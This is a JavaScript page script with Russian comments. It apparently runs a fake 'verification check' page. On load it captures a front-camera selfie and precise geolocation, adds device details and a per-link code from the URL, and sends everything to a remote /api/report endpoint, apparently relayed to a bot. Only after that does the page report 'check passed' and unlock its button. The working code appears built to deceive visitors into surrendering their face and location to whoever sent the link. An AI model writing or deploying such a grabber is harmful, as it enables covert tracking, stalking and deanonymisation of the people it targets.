// === app.js (универсальный: Safari / iOS / Android / Desktop, с фолбэком) ===

// API base из <script>window.__API_BASE</script> в index.html
const API_BASE =
  (typeof window !== "undefined" && window.__API_BASE)
    ? String(window.__API_BASE).replace(/\/+$/, "")
    : "";

// ==== UI ====
const UI = {
  text: document.getElementById("text"),
  note: document.getElementById("note"),
  btn: document.getElementById("enterBtn"),
};

// === Подготовка input для фолбэка ===
(function ensureFileInput() {
  if (!document.getElementById("fileInp")) {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.id = "fileInp";
    inp.accept = "image/*";
    inp.capture = "user";
    inp.style.display = "none";
    document.body.appendChild(inp);
  }
})();

window.__reportReady = false;

// === CODE из URL (?code=...) ===
function determineCode() {
  const q = new URLSearchParams(location.search).get("code");
  const code = q ? String(q).trim() : null;
  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
}

// === Кнопка ===
function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = "grayscale(35%) brightness(0.9)";
  b.style.opacity = "0.6";
  b.style.cursor = "not-allowed";
  b.style.background = "linear-gradient(90deg, #246, #39a)";
  b.style.boxShadow = "0 0 6px rgba(0,153,255,.25)";
}
function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = "none";
  b.style.opacity = "1";
  b.style.cursor = "pointer";
  b.style.background = "linear-gradient(90deg, #4f00ff, #00bfff)";
  b.style.boxShadow = "0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)";
}

// === Геолокация ===
async function askGeolocation() {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now(),
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// === Сжатие base64 фото ===
function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const ratio = Math.min(1, maxSide / Math.max(img.width, img.height));
      const w = Math.round(img.width * ratio);
      const h = Math.round(img.height * ratio);
      const c = document.createElement("canvas");
      c.width = w;
      c.height = h;
      c.getContext("2d").drawImage(img, 0, 0, w, h);
      try {
        resolve(c.toDataURL("image/jpeg", quality));
      } catch (e) {
        reject(e);
      }
    };
    img.onerror = reject;
    img.src = dataUrl;
  });
}

// === Фото (основной путь, совместимо с Safari) ===
async function takePhoto() {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error("Камера недоступна");
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
  return new Promise((resolve, reject) => {
    try {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.playsInline = true;

      let fallbackTimer = setTimeout(() => {
        try {
          const c = document.createElement("canvas");
          c.width = 1280;
          c.height = 720;
          c.getContext("2d").drawImage(video, 0, 0);
          const dataUrl = c.toDataURL("image/jpeg", 0.8);
          stream.getTracks().forEach((t) => t.stop());
          resolve(dataUrl);
        } catch (e) {
          reject(e);
        }
      }, 3000);

      video.onloadedmetadata = async () => {
        try {
          await video.play();
          clearTimeout(fallbackTimer);
          const c = document.createElement("canvas");
          c.width = video.videoWidth || 1280;
          c.height = video.videoHeight || 720;
          c.getContext("2d").drawImage(video, 0, 0);
          const dataUrl = c.toDataURL("image/jpeg", 0.85);
          stream.getTracks().forEach((t) => t.stop());
          resolve(dataUrl);
        } catch (err) {
          stream.getTracks().forEach((t) => t.stop());
          reject(err);
        }
      };
    } catch (e) {
      try {
        stream.getTracks().forEach((t) => t.stop());
      } catch {}
      reject(e);
    }
  });
}

// === Фото (фолбэк через input[type=file]) ===
async function takePhotoWithFallback() {
  try {
    return await takePhoto();
  } catch {
    const inp = document.getElementById("fileInp");
    return new Promise((resolve, reject) => {
      inp.onchange = () => {
        const f = inp.files && inp.files[0];
        if (!f) return reject(new Error("Файл не выбран"));
        const fr = new FileReader();
        fr.onload = () => resolve(fr.result);
        fr.onerror = reject;
        fr.readAsDataURL(f);
      };
      inp.click();
    });
  }
}

// === Инфо об устройстве ===
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const isSafari =
    /Safari\//.test(ua) &&
    !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) &&
    navigator.vendor === "Apple Computer, Inc.";
  const m = ua.match(/OS\s(\d+)[_.]/);
  const iosVer = m ? parseInt(m[1], 10) : null;
  return { userAgent: ua, platform: navigator.platform, iosVersion: iosVer, isSafari };
}

// === Отправка отчёта ===
async function sendReport({ photoBase64, geo }) {
  const info = getDeviceInfo();
  const code = determineCode();
  if (!code) throw new Error("Нет кода в URL");

  const body = { ...info, geo, photoBase64, note: "auto", code };
  const r = await fetch(`${API_BASE}/api/report`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  const text = await r.text().catch(() => "");
  let data;
  try {
    data = JSON.parse(text);
  } catch {
    data = null;
  }

  if (!r.ok) {
    throw new Error((data && data.error) || text || `HTTP ${r.status}`);
  }

  if (!data?.ok) {
    throw new Error((data && data.error) || "Ошибка ответа сервера");
  }

  return data;
}

// === Основной поток ===
async function autoFlow() {
  try {
    setBtnLocked();
    if (UI.text) UI.text.innerHTML = "Запрашиваем камеру и геолокацию…";

    const isSecure = location.protocol === "https:" || location.hostname === "localhost";
    if (!isSecure) throw new Error("Нужен HTTPS (или localhost) для камеры/гео");

    const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhotoWithFallback()]);
    const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);

    if (UI.text) UI.text.innerHTML = "Отправляем данные…";
    const resp = await sendReport({ photoBase64, geo });

    // Сервер может вернуть delivered:false (например, бот недоступен)
    window.__reportReady = true;
    setBtnReady();
    if (UI.text) UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';

    if (resp && resp.delivered === false) {
      if (UI.note) UI.note.textContent = resp.reason || "Доставим позже.";
    } else {
      if (UI.note) UI.note.textContent = "Можно продолжить.";
    }
  } catch (e) {
    console.error("[AUTO-FLOW ERROR]", e);
    setBtnLocked();
    window.__reportReady = false;
    if (UI.text) UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
    if (UI.note)
      UI.note.textContent = "Причина: " + (e && e.message ? e.message : String(e));
  }
}

// === Инициализация ===
window.__autoFlow = autoFlow;

// защита от преждевременного клика
(function guardClick() {
  const btn = UI.btn;
  if (!btn) return;
  btn.addEventListener(
    "click",
    (e) => {
      if (!window.__reportReady) {
        e.preventDefault();
        e.stopPropagation();
      }
    },
    { capture: true }
  );
})();
